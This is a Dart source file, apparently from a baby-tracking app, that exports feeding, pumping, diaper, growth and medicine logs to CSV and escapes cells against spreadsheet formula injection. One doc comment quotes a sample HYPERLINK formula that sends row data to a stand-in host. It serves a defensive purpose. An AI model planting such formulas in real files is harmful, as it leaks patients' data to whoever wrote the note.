import '../../core/format/volume_format.dart';
import '../growth/growth_units.dart';
import '../medication/medication_format.dart';
import 'export_data.dart';

/// Builds a flat CSV of every logged record (KAN-164), one row per entry
/// across feeding, diaper, and growth, sorted by time. A single sheet with a
/// Type column is the most useful thing to hand a pediatrician or open in
/// a spreadsheet.
String buildCsv(ExportData data) {
  final units = data.units;
  final metric = units.isMetric;
  final headers = [
    'Type',
    'Date',
    'Time',
    'Subtype',
    'Poop size',
    'Snack',
    'Duration (min)',
    'Amount (ml)',
    if (!metric) 'Amount (fl oz)',
    'Milk',
    'Side',
    metric ? 'Weight (kg)' : 'Weight (lb oz)',
    metric ? 'Height (cm)' : 'Height (in)',
    metric ? 'Head (cm)' : 'Head (in)',
    'Notes',
    // Last, so a spreadsheet built on the columns before it still lines up.
    'Dose',
  ];

  final rows = <({DateTime at, List<String> cells})>[
    for (final f in data.feedings)
      (
        at: f.startTime,
        cells: [
          'Feeding',
          _date(f.startTime),
          _time(f.startTime),
          f.type.name,
          '',
          // Blank rather than "no", so filtering on "yes" is one click and the
          // column stays quiet on the many rows it does not apply to.
          f.isSnack ? 'yes' : '',
          f.durationMinutes?.toString() ?? '',
          _num(f.amountMl),
          if (!metric) f.amountMl == null ? '' : formatFlOz(f.amountMl!),
          // What was in the bottle; blank on feeds logged before it was asked.
          f.milk?.label ?? '',
          f.side?.name ?? '',
          '',
          '',
          '',
          f.notes ?? '',
          '',
        ],
      ),
    // Pumping fits the existing columns exactly — duration, amount, side —
    // so it needs no schema of its own. The Type column tells it apart from a
    // breast feed, which matters: milk pumped is not milk the baby drank.
    for (final p in data.pumps)
      (
        at: p.time,
        cells: [
          'Pumping',
          _date(p.time),
          _time(p.time),
          '',
          '',
          '',
          p.durationMinutes?.toString() ?? '',
          _num(p.amountMl),
          if (!metric) p.amountMl == null ? '' : formatFlOz(p.amountMl!),
          '',
          p.side?.name ?? '',
          '',
          '',
          '',
          p.notes ?? '',
          '',
        ],
      ),
    for (final d in data.diapers)
      (
        at: d.time,
        cells: [
          'Diaper',
          _date(d.time),
          _time(d.time),
          d.type.name,
          d.poopSize?.label ?? '',
          '',
          '',
          '',
          if (!metric) '',
          '',
          '',
          '',
          '',
          '',
          d.notes ?? '',
          '',
        ],
      ),
    for (final g in data.growth)
      (
        at: g.date,
        cells: [
          'Growth',
          _date(g.date),
          '',
          '',
          '',
          '',
          '',
          '',
          if (!metric) '',
          '',
          '',
          g.weightKg == null ? '' : formatWeight(g.weightKg!, units),
          g.heightCm == null ? '' : formatLength(g.heightCm!, units),
          g.headCm == null ? '' : formatLength(g.headCm!, units),
          '',
          '',
        ],
      ),
    // Medicine: the name as its subtype, and the dose in a column of its
    // own, since "2.5 ml" of a medicine is not millilitres of milk.
    for (final m in data.meds)
      (
        at: m.time,
        cells: [
          'Medicine',
          _date(m.time),
          _time(m.time),
          m.name,
          '',
          '',
          '',
          '',
          if (!metric) '',
          '',
          '',
          '',
          '',
          '',
          m.notes ?? '',
          MedicationFormat.dose(m) ?? '',
        ],
      ),
  ]..sort((a, b) => a.at.compareTo(b.at));

  final buffer = StringBuffer()..writeln(headers.map(escapeCsv).join(','));
  for (final row in rows) {
    buffer.writeln(row.cells.map(escapeCsv).join(','));
  }
  return buffer.toString();
}

/// Characters that make a spreadsheet read a cell as an expression rather
/// than as text. Tab and carriage return are in the set because Excel trims
/// leading whitespace before it decides, so a tab in front of `=1+1` buys
/// nothing.
final _formulaStart = RegExp(r'^[=+\-@\t\r]');

/// Escapes one cell on its way into the sheet. Two separate jobs:
///
/// * RFC 4180 quoting, so a comma, quote, or newline inside a value cannot
///   shear the row apart.
/// * Defusing formulas. Excel, Numbers and Sheets all evaluate a cell that
///   opens with `=`, `+`, `-` or `@`. Notes and medicine names are free text
///   that any caregiver on the baby can write, and this file exists to be
///   handed to a pediatrician who opens it in exactly those programs — so a
///   note of `=HYPERLINK("http://example.invalid?"&A1,"Results")` would
///   reach them as a live link that reports the row back to whoever wrote
///   it. The leading apostrophe is the format's own "this is text" marker.
///   Some Excel builds show it rather than consuming it, which is a fair
///   price for a note that was trying to be a formula.
///
/// No column the sheet generates starts with one of those characters — dates
/// and times do not, and every amount it writes is non-negative — so this
/// only ever fires on free text.
String escapeCsv(String value) {
  final text = value.startsWith(_formulaStart) ? "'$value" : value;
  if (!text.contains(RegExp('[",\n\r]'))) return text;
  return '"${text.replaceAll('"', '""')}"';
}

String _date(DateTime d) =>
    '${d.year.toString().padLeft(4, '0')}-'
    '${d.month.toString().padLeft(2, '0')}-'
    '${d.day.toString().padLeft(2, '0')}';

String _time(DateTime d) =>
    '${d.hour.toString().padLeft(2, '0')}:${d.minute.toString().padLeft(2, '0')}';

String _num(double? v) {
  if (v == null) return '';
  return v == v.roundToDouble() ? v.toStringAsFixed(0) : v.toString();
}

/// Suggested filename, e.g. `Ada-log-2026-07-01-to-2026-07-24.csv`.
String csvFilename(ExportData data) {
  final safeName = data.baby.name.replaceAll(RegExp(r'[^A-Za-z0-9_-]'), '_');
  return '$safeName-log-${_date(data.start)}-to-${_date(data.end)}';
}
